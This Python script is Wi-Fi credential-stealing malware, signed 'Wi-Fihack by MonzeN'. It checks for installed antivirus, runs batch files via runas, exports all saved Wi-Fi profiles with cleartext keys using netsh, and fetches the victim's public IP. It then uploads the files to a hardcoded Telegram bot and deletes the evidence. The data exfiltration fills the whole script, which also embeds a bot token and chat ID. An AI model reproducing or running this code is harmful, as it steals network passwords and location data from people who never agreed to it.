import os
import subprocess
import requests
from glob import glob
import platform
import getpass
def main():
    TOKEN = '5311713070:AAE2bzgCgeybLBaeO2pu9Muol5haf1g6YMY'
    CHAT_ID = '1434743208'
    url = f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}' # ссылка на отправку сообщения
    Antiviruses = {
        'C:\\Program Files\\Windows Defender': 'Windows Defender',
        'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
        'C:\\Program Files\\AVG\\Antivirus': 'AVG',
        'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
        'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
        'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
        'C:\\Program Files\\DrWeb': 'Dr.Web',
        'C:\\Program Files\\ESET\\ESET Security': 'ESET',
        'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
        'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
        'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32'
        }
    Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
    wlanlist = ["wlan10", "wlan7", "wlanXP"]
    def start(name):
        user = getpass.getuser()
        filepath = r'C:/Users/'+ user + '/Desktop/wifi/.bat/' + name + '.bat'
        command = f'runas /user:{user} "{filepath}"'
        subprocess.run(command, shell=True)
    system = platform.release()
    if system == "10":
        start(wlanlist[0])
    elif system == "7":
        start(wlanlist[1])
    elif system == "XP":
        start(wlanlist[2])
    subprocess.call('netsh wlan export profile key=clear')
    response = requests.get('http://myip.dnsomatic.com')
    ip = response.text
    with open("get_ip", "w") as getip:
        getip.write(ip)
    for file in list(glob(os.path.join('*.xml'))): # ищем все файлы с расширением .xml
        try:
            with requests.Session() as session:
                session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
                session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                session.post(url,files={"document": open(file, 'rb')})
        except:
            pass
    try:
        with requests.Session() as session:
            session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
            session.post(url,files={"document": open("get_ip", 'rb')})
    except:
        pass
    try:
        with requests.Session() as session:
            session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
            session.post("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT_ID+"&parse_mode=html&text="+'Wi-Fihack by MonzeN')
    except:
        pass
    for file in list(glob(os.path.join('*.xml'))):
        os.remove(file)
    os.remove(getip)

main()